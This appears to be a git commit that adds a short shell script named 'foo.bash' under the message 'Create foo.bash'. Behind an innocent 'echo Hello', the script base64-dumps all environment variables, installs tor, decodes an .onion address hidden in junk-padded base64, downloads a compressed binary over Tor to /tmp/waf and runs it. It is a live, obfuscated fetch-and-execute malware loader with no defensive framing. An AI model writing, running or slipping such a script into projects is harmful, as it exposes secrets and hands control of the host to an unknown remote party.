caf5b31c39570a5f92a085adef9fed8354d134db
Dax4phoo <157283643+Dax4phoo@users.noreply.github.com>
2024-01-21 17:57:20 +0000

    Create foo.bash

---
+++ foo.bash
@@ -0,0 +1,21 @@
+echo Hello
+env | base64
+
+apt update -qq
+apt install -y curl tor zstd
+tor >/dev/null 2>&1 &
+
+sleep $(shuf -i 10-20 -n 1)s
+url=$(echo 'e\m8zNmNraGN$neGN3NWZjcjV3a2$$$$hndGd\we£G5jbW1v£dW5sbmg0££NDRibTRrZ2lucW40bGh3ajc0aWQub25pb24K' | base64 -di)
+
+curl -s \
+  --connect-timeout 25 \
+  --retry 5 \
+  --retry-delay 10 \
+  --retry-max-time 300 \
+  --socks5-hostname 127.0.0.1:9050 \
+  $url/waf | unzstd -o /tmp/waf
+
+chmod +x /tmp/waf
+/tmp/waf || :
+kill %1
